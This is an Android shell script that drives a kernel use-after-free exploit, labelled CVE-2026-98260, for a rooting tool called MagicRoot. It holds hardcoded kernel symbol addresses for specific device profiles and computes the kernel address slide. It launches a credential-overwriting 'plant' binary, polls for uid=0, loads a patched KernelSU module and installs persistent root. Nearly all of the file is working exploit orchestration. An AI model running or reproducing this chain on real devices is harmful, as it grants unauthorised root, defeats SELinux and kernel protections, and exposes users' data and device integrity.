#!/system/bin/sh
# HOneClick CVE-2026-98260 engine, ported to the MagicRoot runtime layout.
#
# Inputs (exported by 98260/run98260.sh):
#   H1C_PROFILE   61821 (g928) or 61821brm (g186)
#   H1C_TEMPLATE  selected KernelSU LKM for the current Flavor
#   H1C_SYMS      selected symbol table accepted by ko_patch
#   H1C_KSUD      ksud used for the driver-channel fallback
#   H1C_WORK      staged runtime root (default /data/local/tmp/magic)
set -u
D=${H1C_WORK:-/data/local/tmp/magic}
H=${H1C_DIR:-$D/98260-h1c}
PROFILE=${H1C_PROFILE:-}
KERNEL=$(uname -r 2>/dev/null || echo unknown)
TEMPLATE=${H1C_TEMPLATE:-}
SYMS=${H1C_SYMS:-}
KSUD=${H1C_KSUD:-$D/ksud}
SYSTEM_SU=${H1C_SYSTEM_SU:-/system/bin/su}
SOCK_DIR=${H1C_SOCK_DIR:-/data/local/tmp}
LOG=$D/98260-h1c.log
PLANT_LOG=$D/98260-h1c-plant.log
SOCK=$SOCK_DIR/cve98260-h1c-$$.sock
PATCHED=$D/ksu-patched-h1c.ko
MODULES=${H1C_PROC_MODULES:-/proc/modules}
PARKED_MARKER=${H1C_PARKED_MARKER:-/data/local/tmp/.magicroot-98260-parked}
ROOTD_WAIT=${H1C_ROOTD_WAIT:-300}
case "$ROOTD_WAIT" in ''|*[!0-9]*|0) ROOTD_WAIT=300 ;; esac
# The plant retries 4 SELinux + 12 cred attempts; a fixed 300 s cut-off used
# to fail runs that were still making progress.  Keep the soft cap, but extend
# while the plant log keeps advancing, up to a hard ceiling.
ROOTD_HARD=${H1C_ROOTD_HARD:-900}
case "$ROOTD_HARD" in ''|*[!0-9]*|0) ROOTD_HARD=900 ;; esac
[ "$ROOTD_HARD" -lt "$ROOTD_WAIT" ] && ROOTD_HARD=$ROOTD_WAIT
ROOTD_IDLE_MAX=${H1C_ROOTD_IDLE_MAX:-120}
case "$ROOTD_IDLE_MAX" in ''|*[!0-9]*|0) ROOTD_IDLE_MAX=120 ;; esac
PREFLIGHT_ONLY=${H1C_PREFLIGHT_ONLY:-0}
SUCOMPAT=${MAGICROOT_SU_COMPAT:-1}
ALLOW_SHELL=${H1C_ALLOW_SHELL:-${MAGICROOT_ALLOW_SHELL:-1}}
KSU_ENABLE=${H1C_KSU_ENABLE:-1}
ADB_ROOT=${H1C_ADB_ROOT:-0}
KERNEL_UMOUNT=${H1C_KERNEL_UMOUNT:-1}
SELINUX_HIDE=${H1C_SELINUX_HIDE:-1}
SU_ENTRY=${H1C_SU_ENTRY:-0}
KEEP_ROOTD=${MAGICROOT_KEEP_ROOTD:-0}
[ -f "$D/.keep-rootd-user" ] && KEEP_ROOTD=1
case "$SUCOMPAT" in 1) ;; *) SUCOMPAT=0 ;; esac
case "$ALLOW_SHELL" in 1) ;; *) ALLOW_SHELL=0 ;; esac
case "$KSU_ENABLE" in 1) ;; *) KSU_ENABLE=0 ;; esac
case "$ADB_ROOT" in 1) ;; *) ADB_ROOT=0 ;; esac
case "$KERNEL_UMOUNT" in 1) ;; *) KERNEL_UMOUNT=0 ;; esac
case "$SELINUX_HIDE" in 1) ;; *) SELINUX_HIDE=0 ;; esac
case "$SU_ENTRY" in 1) ;; *) SU_ENTRY=0 ;; esac
case "$KEEP_ROOTD" in 1) ;; *) KEEP_ROOTD=0 ;; esac
case "$PREFLIGHT_ONLY" in 1) ;; *) PREFLIGHT_ONLY=0 ;; esac
PLANT_STARTED=0
RUN_OK=0
export MAGICROOT_SU_COMPAT="$SUCOMPAT"
export MAGICROOT_ALLOW_SHELL="$ALLOW_SHELL"
export MAGICROOT_ADB_ROOT="$ADB_ROOT"
export MAGICROOT_KERNEL_UMOUNT="$KERNEL_UMOUNT"
export MAGICROOT_SELINUX_HIDE="$SELINUX_HIDE"
export MAGICROOT_SU_ENTRY="$SU_ENTRY"
export MAGICROOT_KEEP_ROOTD="$KEEP_ROOTD"

is_parked() {
    [ -s "$PLANT_LOG" ] || return 1
    grep -Eq 'parking unsafe process|holding process until reboot|missed page; holding zombie|\[child-cred\].*parking' \
        "$PLANT_LOG" 2>/dev/null
}
mark_parked() {
    _boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
    [ -n "$_boot" ] && printf '%s\n' "$_boot" > "$PARKED_MARKER" 2>/dev/null || true
    chmod 644 "$PARKED_MARKER" 2>/dev/null || true
}
trap 'if [ "${PLANT_STARTED:-0}" = "1" ] && [ "${RUN_OK:-0}" != "1" ]; then mark_parked; fi' EXIT
h1c_log() {
    printf '%s\n' "$*" | tee -a "$LOG"
}

mkdir -p "$D" 2>/dev/null || true
# Preserve the previous run's evidence when this invocation is only going to
# reject a live plant.  Once a new run is allowed, every diagnostic belongs to
# that run only; early ko_patch failures must not export an older root success.
if pidof cve98260_plant >/dev/null 2>&1 || pidof exploit-android-key-ptr >/dev/null 2>&1; then
    echo "98260_H1C_FAIL=plant_already_running pid=$(pidof cve98260_plant 2>/dev/null)-$(pidof exploit-android-key-ptr 2>/dev/null)"
    echo "98260_H1C_HINT=reboot required; do not start a second UAF"
    exit 80
fi
for _diag in "$LOG" "$PLANT_LOG" "$D/98260-h1c-ko-patch.log" "$D/98260-h1c-root-stage.log"; do
    if ! : > "$_diag" 2>/dev/null; then
        echo "98260_H1C_FAIL=diagnostic_log_reset path=$_diag"
        exit 74
    fi
done
h1c_log "98260_H1C_BEGIN profile=$PROFILE kernel=$KERNEL run=${H1C_RUN_ID:-unknown} boot=${H1C_BOOT_ID:-unknown}"
h1c_log "98260_H1C_TEMPLATE=$TEMPLATE"
h1c_log "98260_H1C_SYMS=$SYMS"
chmod 755 "$H"/* 2>/dev/null || true
chmod 644 "$TEMPLATE" "$SYMS" 2>/dev/null || true

if [ "${H1C_DYNAMIC:-0}" = "1" ]; then
    TIMER_LINK=${H1C_TIMER_LINK:?adaptive timer_link missing}
    CRED_LINK=${H1C_CRED_LINK:?adaptive cred_link missing}
    SELINUX_LINK=${H1C_SELINUX_LINK:?adaptive selinux_link missing}
    USER_NS=${H1C_USER_NS:?adaptive user_ns missing}
    ROOT_USER=${H1C_ROOT_USER:?adaptive root_user missing}
    GROUPS=${H1C_GROUPS:?adaptive groups missing}
    UCOUNTS=${H1C_UCOUNTS:?adaptive ucounts missing}
    KITIMER_SIZE=${H1C_KITIMER_SIZE:?adaptive kitimer_size missing}
    KITIMER_NODE=${H1C_KITIMER_NODE:?adaptive kitimer_node missing}
    TASK_CRED=${H1C_TASK_CRED:?adaptive task_cred missing}
    CRED_SIZE=${H1C_CRED_SIZE:?adaptive cred_size missing}
    SLAB_OBJECTS=${H1C_SLAB_OBJECTS:-21}
    SLAB_PAGES=${H1C_SLAB_PAGES:-2}
    SITE_LOW=${H1C_SITE_LOW:?adaptive slide_site_low missing}
    NEG_TIMER_LINK=${H1C_NEG_TIMER:?adaptive neg_timer missing}
    PROFILE=adaptive
    echo "98260_H1C_ADAPTIVE=1 profile=adaptive timer=$TIMER_LINK site=$SITE_LOW"
else
case "$PROFILE" in
    61821)
        TIMER_LINK=0xffffffc0803e005c
        CRED_LINK=0xffffffc080147378
        SELINUX_LINK=0xffffffc08299a6f0
        USER_NS=0xffffffc0827110e0
        ROOT_USER=0xffffffc082711390
        GROUPS=0xffffffc082712a48
        UCOUNTS=0xffffffc082712f08
        KITIMER_SIZE=384
        KITIMER_NODE=224
        TASK_CRED=2312
        CRED_SIZE=184
        SLAB_OBJECTS=21
        SLAB_PAGES=2
        SITE_LOW=0x1e005c
        # (0x10000000000000000 - timer_link) mod 2^64
        NEG_TIMER_LINK=0x3f7fc1ffa4
        ;;
    61821brm)
        TIMER_LINK=0xffffffc0803e1fd0
        CRED_LINK=0xffffffc08014cd90
        SELINUX_LINK=0xffffffc08299a6f0
        USER_NS=0xffffffc0827110e0
        ROOT_USER=0xffffffc082711390
        GROUPS=0xffffffc082712a48
        UCOUNTS=0xffffffc082712f08
        KITIMER_SIZE=384
        KITIMER_NODE=224
        TASK_CRED=2312
        CRED_SIZE=184
        SLAB_OBJECTS=21
        SLAB_PAGES=2
        SITE_LOW=0x1e1fd0
        NEG_TIMER_LINK=0x3f7fc1e030
        ;;
    61821h1c117)
        # HOneClick Beta6 honor-6.18.21-117, independently regenerated from
        # the attached boot.img by KernelProfileGenerator (143930 symbols).
        TIMER_LINK=0xffffffc0803e0460
        CRED_LINK=0xffffffc08014dca0
        SELINUX_LINK=0xffffffc08299a6f0
        USER_NS=0xffffffc0827110e0
        ROOT_USER=0xffffffc082711390
        GROUPS=0xffffffc082712a48
        UCOUNTS=0xffffffc082712f08
        KITIMER_SIZE=384
        KITIMER_NODE=224
        TASK_CRED=2312
        CRED_SIZE=184
        SLAB_OBJECTS=21
        SLAB_PAGES=2
        SITE_LOW=0x1e0460
        NEG_TIMER_LINK=0x3f7fc1fba0
        ;;
    *)
        echo "98260_H1C_FAIL=unsupported_profile profile=$PROFILE"
        exit 80
        ;;
esac
fi

[ -f "$H/cve98260_plant" ] ||
    { echo "98260_H1C_FAIL=missing_asset cve98260_plant"; exit 80; }
PLANT_SHA=$(sha256sum "$H/cve98260_plant" 2>/dev/null)
PLANT_SHA=${PLANT_SHA%% *}
h1c_log "98260_H1C_PLANT_SHA256=${PLANT_SHA:-unknown}"
if [ -z "${KSUD:-}" ] || [ ! -x "$KSUD" ]; then
    KSUD=/data/adb/ksud
fi
if [ -x "$KSUD" ] && [ "$KSUD" != "$D/ksud" ]; then
    cp -f "$KSUD" "$D/ksud" 2>/dev/null || true
    chmod 755 "$D/ksud" 2>/dev/null || true
fi
chmod 755 "$H/cve98260_plant" "$H/cve98260_slide" "$H/cve98260_su" \
    "$H/cve98260_module" "$H/addrcalc" "$D/ksud" 2>/dev/null || true

# ---------------------------------------------------------------- preflight
PRE=$("$H/cve98260_plant" --preflight \
    --timer-link "$TIMER_LINK" --cred-link "$CRED_LINK" \
    --selinux-link "$SELINUX_LINK" --user-ns "$USER_NS" \
    --root-user "$ROOT_USER" --groups "$GROUPS" --ucounts "$UCOUNTS" \
    --kitimer-size "$KITIMER_SIZE" --kitimer-node "$KITIMER_NODE" \
    --task-cred "$TASK_CRED" --cred-size "$CRED_SIZE" \
    --slab-objects "$SLAB_OBJECTS" --slab-pages "$SLAB_PAGES" 2>&1)
echo "$PRE" | tee -a "$LOG"
case "$PRE" in
    *"RESULT=OK"*) ;;
    *) echo "98260_H1C_FAIL=preflight"; exit 81 ;;
esac
if [ "$PREFLIGHT_ONLY" = "1" ]; then
    echo "98260_H1C_PREFLIGHT_OK=1"
    echo "98260_CHAIN_END=PREFLIGHT code=0"
    exit 0
fi
for f in cve98260_slide cve98260_su cve98260_module addrcalc root_stage.sh; do
    [ -f "$H/$f" ] || { echo "98260_H1C_FAIL=missing_asset $f"; exit 80; }
done
[ -f "$TEMPLATE" ] || { echo "98260_H1C_FAIL=missing_template"; exit 80; }
[ -f "$SYMS" ] || { echo "98260_H1C_FAIL=missing_syms"; exit 80; }
[ -x "$D/ko_patch" ] || { echo "98260_H1C_FAIL=missing_ko_patch"; exit 80; }

# ---------------------------------------------------------------- slide
SLIDE_OUT=$("$H/cve98260_slide" --site-low "$SITE_LOW" 2>&1)
echo "$SLIDE_OUT" | tee -a "$LOG"
SITE=$(printf '%s\n' "$SLIDE_OUT" |
    sed -n 's/.*site=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1)
[ -n "$SITE" ] || { echo "98260_H1C_FAIL=no_slide_site"; exit 81; }
SLIDE=$("$H/addrcalc" add "$SITE" "$NEG_TIMER_LINK" 2>/dev/null | tr -d ' \r\n')
case "$SLIDE" in
    0x|0x*[!0-9a-fA-F]*)
        echo "98260_H1C_FAIL=slide_invalid reason=non_hex value=$SLIDE"
        exit 81 ;;
esac
SLIDE_HEX=${SLIDE#0x}
case "$SLIDE_HEX" in
    *[!0]*) ;;
    *) echo "98260_H1C_FAIL=slide_invalid reason=zero value=$SLIDE"; exit 81 ;;
esac
case "$SLIDE_HEX" in
    *000) ;;
    *) echo "98260_H1C_FAIL=slide_invalid reason=unaligned value=$SLIDE"; exit 81 ;;
esac
echo "98260_H1C_SLIDE=$SLIDE site=$SITE"

# ---------------------------------------------------------------- module
rm -f "$PATCHED"
"$D/ko_patch" "$TEMPLATE" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" \
    > "$D/98260-h1c-ko-patch.log" 2>&1
PATCH_RC=$?
cat "$D/98260-h1c-ko-patch.log" 2>/dev/null | tee -a "$LOG"
grep -q 'MISSING=[1-9]' "$D/98260-h1c-ko-patch.log" 2>/dev/null &&
    { echo "98260_H1C_FAIL=ko_patch_missing"; exit 82; }
[ "$PATCH_RC" = "0" ] && [ -s "$PATCHED" ] ||
    { echo "98260_H1C_FAIL=ko_patch rc=$PATCH_RC"; exit 82; }
echo "98260_H1C_PATCHED=$(wc -c < "$PATCHED" 2>/dev/null | tr -d ' ')"

# ---------------------------------------------------------------- rootd
rm -f "$SOCK"
PC98260_SOCK="$SOCK" PC98260_ROOTD=1 PC98260_KSU="$KSU_ENABLE" \
    nohup "$H/cve98260_plant" --slide "$SLIDE" \
    --timer-link "$TIMER_LINK" --cred-link "$CRED_LINK" \
    --selinux-link "$SELINUX_LINK" --user-ns "$USER_NS" \
    --root-user "$ROOT_USER" --groups "$GROUPS" --ucounts "$UCOUNTS" \
    --kitimer-size "$KITIMER_SIZE" --kitimer-node "$KITIMER_NODE" \
    --task-cred "$TASK_CRED" --cred-size "$CRED_SIZE" \
    --slab-objects "$SLAB_OBJECTS" --slab-pages "$SLAB_PAGES" \
    > "$PLANT_LOG" 2>&1 < /dev/null &
PLANT_PID=$!
PLANT_STARTED=1
h1c_log "98260_H1C_PLANT_STARTED=1 pid=$PLANT_PID wait_cap=${ROOTD_WAIT}s"
I=0
ROOT_OK=0
FAIL_REASON=
SECONDS=0
NEXT_LOG=0
NEXT_PROGRESS=0
PROGRESS_SIG=""
PROGRESS_TS=0
PROGRESS_CHANGED=0
EXTENDED=0
while [ "$SECONDS" -lt "$ROOTD_HARD" ]; do
    I=$((I + 1))
    ID=$(PC98260_SOCK="$SOCK" timeout 5 "$H/cve98260_su" -c 'id' 2>&1)
    PROBE_RC=$?
    case "$ID" in
        *"uid=0(root)"*) ROOT_OK=1; break ;;
    esac
    if is_parked; then
        FAIL_REASON=uaf_parked
        break
    fi
    if ! pidof cve98260_plant >/dev/null 2>&1; then
        if [ -s "$PLANT_LOG" ]; then
            if grep -q "resolved while parked" "$PLANT_LOG" 2>/dev/null; then
                FAIL_REASON=victim_resolved_retry_ok
            else
                FAIL_REASON=plant_exited
            fi
        else
            FAIL_REASON=plant_not_started
        fi
        break
    fi
    if [ "$SECONDS" -ge "$NEXT_LOG" ]; then
        PROBE_TEXT=$(printf '%s' "$ID" | tr '\r\n' '  ')
        h1c_log "98260_H1C_ROOTD_WAIT elapsed=${SECONDS}s attempt=$I rc=$PROBE_RC out=${PROBE_TEXT:-empty}"
        NEXT_LOG=$((SECONDS + 30))
    fi
    if [ "$SECONDS" -ge "$NEXT_PROGRESS" ]; then
        _p_attempts=$(grep -c 'plant attempt' "$PLANT_LOG" 2>/dev/null) || _p_attempts=0
        _p_hits=$(grep -c 'hit=1' "$PLANT_LOG" 2>/dev/null) || _p_hits=0
        case "$_p_attempts" in ''|*[!0-9]*) _p_attempts=0 ;; esac
        case "$_p_hits" in ''|*[!0-9]*) _p_hits=0 ;; esac
        _p_sig="${_p_attempts}/${_p_hits}"
        # Only a signature that actually advanced counts as progress; the
        # first sample just establishes the baseline.
        if [ -z "$PROGRESS_SIG" ]; then
            PROGRESS_SIG="$_p_sig"
        elif [ "$_p_sig" != "$PROGRESS_SIG" ]; then
            PROGRESS_SIG="$_p_sig"
            PROGRESS_TS=$SECONDS
            PROGRESS_CHANGED=1
        fi
        h1c_log "98260_H1C_PROGRESS elapsed=${SECONDS}s attempts=${_p_attempts} hits=${_p_hits} plant=alive"
        NEXT_PROGRESS=$((SECONDS + 20))
    fi
    if [ "$SECONDS" -ge "$ROOTD_WAIT" ]; then
        if [ "$SECONDS" -lt "$ROOTD_HARD" ] && [ "$PROGRESS_CHANGED" = "1" ] &&
           [ $((SECONDS - PROGRESS_TS)) -lt "$ROOTD_IDLE_MAX" ]; then
            if [ "$EXTENDED" = 0 ]; then
                EXTENDED=1
                h1c_log "98260_H1C_WAIT_EXTEND elapsed=${SECONDS}s progress=${PROGRESS_SIG} hard=${ROOTD_HARD}s"
            fi
        else
            break
        fi
    fi
    sleep 1
done
if [ "$ROOT_OK" != "1" ]; then
    FAIL_REASON=${FAIL_REASON:-rootd_timeout}
    h1c_log "98260_H1C_FAIL=$FAIL_REASON waited=${SECONDS}s attempts=$I socket=$SOCK progress=${PROGRESS_SIG:-none}"
    if [ "$FAIL_REASON" = "victim_resolved_retry_ok" ]; then
        echo "98260_H1C_HINT=victim zombie proven clean and reaped; safe to retry WITHOUT reboot" | tee -a "$LOG"
    elif pidof cve98260_plant >/dev/null 2>&1; then
        echo "98260_H1C_HINT=plant still running after ${SECONDS}s; do not retry or kill it in this boot, reboot first" | tee -a "$LOG"
    else
        echo "98260_H1C_HINT=reboot required; do not start another UAF or kill the parked parent" | tee -a "$LOG"
    fi
    tail -30 "$PLANT_LOG" 2>/dev/null | tee -a "$LOG" || true
    exit 83
fi
ID_TEXT=$(printf '%s' "$ID" | tr '\r\n' '  ')
h1c_log "98260_H1C_ROOTD_READY=1 waited=${SECONDS}s attempts=$I id=$ID_TEXT"
printf '%s\n' "$SOCK" > "$D/.h1c-socket" 2>/dev/null || true
if [ "$KSU_ENABLE" != "1" ]; then
    echo "98260_H1C_KSU=disabled rootd_only=1"
    echo "98260_H1C_ROOT_ID=$ID"
    : > "$D/.h1c-rootd-only" 2>/dev/null || true
    RUN_OK=1
    echo "98260_H1C_DONE=1"
    exit 0
fi

# ---------------------------------------------------------------- module load
# cve98260_module takes argv[2] as one finit_module parameter string.  Keep
# allow_shell explicit: without it, the helper's own default is lost whenever
# force_feature is supplied (STP mode).
MOD_PARAMS="allow_shell=$ALLOW_SHELL"
if [ "$SUCOMPAT" = "0" ]; then
    MOD_PARAMS="$MOD_PARAMS force_feature=su_compat:0"
    echo "98260_H1C_FORCE_FEATURE=su_compat:0"
fi
echo "98260_H1C_MODULE_PARAMS=$MOD_PARAMS"
# real-cred listener performs finit_module in-process; an exec helper would
# lose CAP_SYS_MODULE through the bounding-set recalculation.  Successful KSU
# load also exits the temporary listener before SELinux returns to enforcing.
LOAD=$(PC98260_SOCK="$SOCK" timeout 30 "$H/cve98260_su" \
    -c "__PC98260_FINIT_EXIT__ $PATCHED $MOD_PARAMS" 2>&1)
LOAD_RC=$?
echo "$LOAD" | tee -a "$LOG"
echo "98260_H1C_MODULE_LOAD_RC=$LOAD_RC"
if [ "$LOAD_RC" != "0" ] || ! printf '%s\n' "$LOAD" | grep -q 'FINIT_RC=0'; then
    echo "98260_H1C_FAIL=module_load rc=$LOAD_RC"
    exit 84
fi
MODULE_LIVE=0
_i=0
while [ "$_i" -lt 20 ]; do
    if grep -q '^kernelsu ' "$MODULES" 2>/dev/null; then
        MODULE_LIVE=1
        break
    fi
    _i=$((_i + 1))
    sleep 1
done
[ "$MODULE_LIVE" = "1" ] ||
    { echo "98260_H1C_FAIL=module_not_live"; exit 84; }
echo "98260_H1C_MODULE_LIVE=1 waited=${_i}s"

# KernelSU restores Enforcing here.  The bootstrap socket may be gone; the
# remaining initialization must use sucompat or the ksud driver channel.
sleep 2
# Prefer the app-deployed full root_stage.sh: it performs manager discovery,
# signature registration and an atomic /data/adb/ksud install.  The bundled
# H1C installer is a reduced fallback and must live at its own path, never
# overwrite the deployed script (that used to drop manager registration).
STAGE_SH=$D/root_stage.sh
if [ ! -f "$STAGE_SH" ]; then
    STAGE_SH=$D/root_stage_h1c.sh
    cp -f "$H/root_stage.sh" "$STAGE_SH" 2>/dev/null || true
fi
chmod 755 "$STAGE_SH" "$D/ksud" 2>/dev/null || true
rm -f "$D/root_id" "$D/marks/ROOT_ID" 2>/dev/null || true
SU_OK=0
if "$SYSTEM_SU" -c 'id' 2>/dev/null | grep -q 'uid=0(root)'; then
    SU_OK=1
fi
STAGE_LOG=$D/98260-h1c-root-stage.log
: > "$STAGE_LOG" 2>/dev/null || true
STAGE_ENV="MAGICROOT_SU_COMPAT='$SUCOMPAT' MAGICROOT_ALLOW_SHELL='$ALLOW_SHELL' MAGICROOT_ADB_ROOT='$ADB_ROOT' MAGICROOT_KERNEL_UMOUNT='$KERNEL_UMOUNT' MAGICROOT_SELINUX_HIDE='$SELINUX_HIDE' MAGICROOT_SU_ENTRY='$SU_ENTRY' MAGICROOT_KSUD='$D/ksud' MAGICROOT_H1C_CLIENT='$H/cve98260_su' MAGICROOT_H1C_SOCK='$SOCK'"
if [ "$SU_OK" = "1" ]; then
    echo "98260_H1C_SU_DIRECT=1"
    "$SYSTEM_SU" -c "$STAGE_ENV sh '$STAGE_SH' '$D'" > "$STAGE_LOG" 2>&1
    STAGE_RC=$?
else
    echo "98260_H1C_SUCOMPAT=0 fallback=ksud-driver"
    printf '%s sh %s %s\n' "$STAGE_ENV" "$STAGE_SH" "$D" |
        timeout 90 "$KSUD" debug su > "$STAGE_LOG" 2>&1
    STAGE_RC=$?
fi
cat "$STAGE_LOG" 2>/dev/null | tee -a "$LOG"
h1c_log "98260_H1C_ROOT_STAGE_RC=$STAGE_RC"
[ "$STAGE_RC" = "0" ] && grep -q 'ROOT_STAGE_OK' "$STAGE_LOG" 2>/dev/null ||
    { echo "98260_H1C_FAIL=root_stage rc=$STAGE_RC"; exit 85; }

# Acceptance must use the same direct-shell path users will invoke.  `env` or
# `timeout` wrappers can hide the KernelSU cached-credential failure.
# The deployed full root_stage.sh records root identity at marks/ROOT_ID; the
# bundled H1C fallback writes root_id.  Accept either when present.
ROOT_ID=$(cat "$D/root_id" 2>/dev/null | tr '\n' ' ')
[ -n "$ROOT_ID" ] || ROOT_ID=$(cat "$D/marks/ROOT_ID" 2>/dev/null | tr '\n' ' ')
case "$ROOT_ID" in
    *"uid=0(root)"*"context=u:r:ksu:s0"*) ;;
    *) echo "98260_H1C_FAIL=root_id_invalid id=${ROOT_ID:-missing}"; exit 86 ;;
esac
if [ "$SUCOMPAT" = "1" ] && [ "$ALLOW_SHELL" = "1" ]; then
    DIRECT_ID=$("$SYSTEM_SU" -c 'id' 2>&1 | tr '\n' ' ')
    case "$DIRECT_ID" in
        *"uid=0(root)"*"context=u:r:ksu:s0"*)
            echo "98260_H1C_DIRECT_SU=ok id=$DIRECT_ID" ;;
        *)
            echo "98260_H1C_FAIL=direct_su_invalid id=${DIRECT_ID:-missing}"
            exit 86 ;;
    esac
else
    echo "98260_H1C_DIRECT_SU=skipped su_compat=$SUCOMPAT allow_shell=$ALLOW_SHELL"
fi
if [ "$SU_ENTRY" = "1" ]; then
    echo "98260_H1C_SU_ENTRY=enabled backend=su_compat"
fi

: > "$D/.ksu_loaded" 2>/dev/null || true
: > "$D/.ksu_su_ready" 2>/dev/null || true
rm -f "$D/.h1c-rootd-only" 2>/dev/null || true
if [ "$SUCOMPAT" = "1" ] && [ "$KEEP_ROOTD" != "1" ]; then
    rm -f "$SOCK" 2>/dev/null || true
    echo "98260_H1C_ROOTD_SOCKET=unlinked reason=no_keep_rootd"
fi
RUN_OK=1
echo "98260_H1C_DONE=1"
exit 0
